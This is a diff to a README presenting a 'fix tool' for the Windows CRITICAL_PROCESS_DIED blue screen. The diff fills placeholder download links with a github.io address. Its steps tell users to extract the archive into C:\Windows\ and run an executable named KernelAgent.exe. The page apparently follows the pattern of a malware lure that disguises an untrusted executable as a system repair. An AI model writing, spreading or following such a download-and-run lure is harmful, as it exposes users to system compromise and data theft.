@@ -2,7 +2,8 @@
 
 This tool provides a fast fix for the CRITICAL_PROCESS_DIED BSOD on Windows 10/11, caused by system process failure, corrupt drivers, or broken services.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)]()
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-critical-process-died-windows-11.github.io/.github
+)
 
 ---
 
@@ -17,7 +18,8 @@ This tool provides a fast fix for the CRITICAL_PROCESS_DIED BSOD on Windows 10/1
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fix-critical-process-died-windows-11.github.io/.github
+) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe`  
 4. 🔁 Restart your computer after the process is complete
